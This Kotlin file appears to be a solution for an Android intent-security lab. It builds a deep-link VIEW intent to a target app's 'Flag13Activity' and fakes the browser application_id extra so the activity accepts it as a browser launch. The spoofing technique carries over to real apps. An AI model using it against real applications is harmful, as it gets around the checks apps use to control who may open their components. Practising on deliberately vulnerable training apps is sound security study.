package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.core.net.toUri
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import kotlin.time.Duration.Companion.milliseconds

object Flag13 {
    fun getFlag(context: Context) {
        val uri = "hex://flag?action=give-me".toUri()
        val intent = Intent("android.intent.action.VIEW", uri).apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag13Activity"
            )
            addCategory("android.intent.category.DEFAULT")
            addCategory("android.intent.category.BROWSABLE")
            putExtra("com.android.browser.application_id", "asdada")
        }
        Utils.showDialog(context, intent)
        runBlocking {
            delay(3000.milliseconds)
            context.startActivity(intent)
        }
    }
}
